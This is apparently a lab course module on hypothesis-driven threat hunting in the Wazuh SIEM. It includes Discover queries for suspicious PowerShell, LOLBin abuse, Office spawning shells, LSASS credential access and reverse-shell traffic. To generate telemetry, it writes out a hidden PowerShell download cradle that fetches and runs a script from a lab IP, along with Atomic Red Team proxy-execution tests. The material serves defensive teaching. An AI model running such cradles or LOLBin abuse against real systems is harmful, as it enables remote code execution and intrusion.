# 07 — Proactive Threat Hunting Techniques

**Course topic: 9.4 Proactive Threat Hunting Techniques**
**Where:** Wazuh dashboard (`siem`) for hunting; Kali/victim to plant the activity you'll hunt.

**Goal:** move from *waiting for alerts* to *actively looking*. Teach a repeatable, hypothesis-driven hunt loop and run real hunts against telemetry you generate.

---

## 1. What threat hunting is (teach this)

Threat hunting is **proactively searching** telemetry for malicious activity that automated alerts missed. Assumptions:

- **Assume breach** — act as if an adversary is already inside.
- **Hypothesis-driven** — start from a specific, testable idea, not "let's look around."
- **Behavior over signatures** — hunt TTPs (ATT&CK), because IoCs get evaded.

### The hunt loop

```
1. Hypothesis   → "An attacker may be using PowerShell to download payloads."
2. Data         → Which telemetry proves/disproves it? (Sysmon EID 1/3, PS Operational)
3. Hunt/Query   → Filter that data in Wazuh Discover.
4. Analyze      → Triage hits: benign, suspicious, malicious?
5. Outcome      → Either a finding (→ IR) OR a gap (→ new detection rule, Doc 08).
6. Document     → Record hypothesis, queries, result. Repeat.
```

The key output of hunting: **either a finding or a new detection**. A hunt that finds nothing still wins if it becomes a rule.

---

## 2. Where you hunt in Wazuh

- **Threat Hunting / Discover** — free-text + field filters over raw events. Your primary hunting surface.
- **Fields to know:** `agent.name`, `rule.mitre.id`, `rule.level`, `data.win.eventdata.image`, `data.win.eventdata.commandLine`, `data.win.eventdata.parentImage`, `data.win.eventdata.destinationIp`, `data.win.system.eventID`.
- Save useful searches; build a couple of **visualizations** (e.g. top parent→child process pairs).

> Query syntax is DQL (Discover query language). Examples below are written to paste into the Discover search bar.

---

## 3. Generate activity to hunt

Snapshot first (`pre-attack`). On the Windows victim, produce a spread of behaviors (Atomic Red Team from Doc 05 is ideal). For a self-contained hunt session:

```powershell
# Suspicious PowerShell download cradle
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.100:8080/x.ps1')"

# LOLBIN proxy execution
Invoke-AtomicTest T1218.010 -TestNumbers 1     # regsvr32
Invoke-AtomicTest T1218.011 -TestNumbers 1     # rundll32

# Discovery burst
Invoke-AtomicTest T1057 -TestNumbers 1         # process discovery
Invoke-AtomicTest T1016 -TestNumbers 1         # network config discovery
```

(These will fail to fully "download" if the file doesn't exist — that's fine, the *attempt* is what you hunt.)

---

## 4. Hunt playbook (run these)

### Hunt A — Suspicious PowerShell
**Hypothesis:** an attacker is using encoded/hidden PowerShell or download cradles.

Discover query:
```
data.win.eventdata.image: *powershell.exe* and (data.win.eventdata.commandLine: *DownloadString* or data.win.eventdata.commandLine: *-enc* or data.win.eventdata.commandLine: *hidden*)
```
Triage: legitimate admin scripts vs. hidden/encoded/remote-download. The download-cradle line above is a clear hit.

### Hunt B — LOLBins (living-off-the-land binaries)
**Hypothesis:** signed Windows binaries are being abused to run code.

```
data.win.eventdata.image: (*regsvr32.exe* or *rundll32.exe* or *mshta.exe* or *wmic.exe* or *certutil.exe*) and data.win.eventdata.commandLine: (*http* or *scrobj* or *javascript* or *urlcache*)
```
Triage: `certutil -urlcache` and `regsvr32 /i:http...` are classic abuse.

### Hunt C — Anomalous parent/child process lineage
**Hypothesis:** Office or a browser is spawning a shell (macro / exploit).

```
data.win.eventdata.parentImage: (*winword.exe* or *excel.exe* or *outlook.exe* or *chrome.exe*) and data.win.eventdata.image: (*cmd.exe* or *powershell.exe* or *wscript.exe*)
```
Triage: Word spawning PowerShell is almost never benign.

### Hunt D — Credential access on LSASS
**Hypothesis:** something is reading LSASS memory (credential dumping).

```
data.win.system.eventID: "10" and data.win.eventdata.targetImage: *lsass.exe*
```
Triage: non-system processes with `GrantedAccess` like `0x1010`/`0x1410` accessing lsass = likely dumping (T1003.001). This becomes a rule in Doc 08.

### Hunt E — New network listeners / unusual outbound
**Hypothesis:** a C2 beacon or reverse shell is talking out.

```
data.win.system.eventID: "3" and data.win.eventdata.destinationPort: (4444 or 8080 or 443) and not data.win.eventdata.image: (*chrome.exe* or *msedge.exe*)
```
Triage: `invoice.exe` beaconing to `10.10.10.100:4444` is your Meterpreter from Doc 04.

### Hunt F (Linux, if built) — Command execution anomalies
```
agent.name: "linux-victim" and data.audit.key: "exec" and data.audit.execve.a0: (*nc* or *bash* or *curl* or *wget*)
```

---

## 5. Baselining (so you know what "normal" is)

Hunting requires a baseline. Have students:
- Snapshot **normal** activity for 10–15 minutes (no attacks) and note the common processes, parents, and destinations.
- Then run attacks and re-hunt — the deltas stand out. This "known-good vs. now" contrast is the core hunting skill.

---

## 6. From hunt to detection

Every good hunt query is a **candidate detection rule**. When Hunt D reliably finds LSASS access, you promote that query into a Wazuh rule so it alerts automatically next time. That handoff is exactly Doc 08.

Update your coverage map: mark which techniques you can currently only *hunt* (manual) vs. *detect* (automated). The module's job is to convert hunts → detections.

---

## Verify

- [ ] You can articulate the 6-step hunt loop.
- [ ] Each hunt (A–E) returns the activity you planted.
- [ ] You saved at least two hunts as saved searches.
- [ ] You identified at least one gap to turn into a rule (e.g. LSASS access).

---

> [!NOTE]
> **Recording checkpoint (9.4):** Record **Lesson 9.4 — Proactive Threat Hunting Techniques** now. Flow: assume-breach mindset + hunt loop → generate activity live → run Hunts A–E in Discover → triage true vs false positives → end on "this hunt becomes a rule," which sets up 9.5. Strong, hands-on lecture.

Next: [08 — Building Detection Rules](08-building-detection-rules.md)
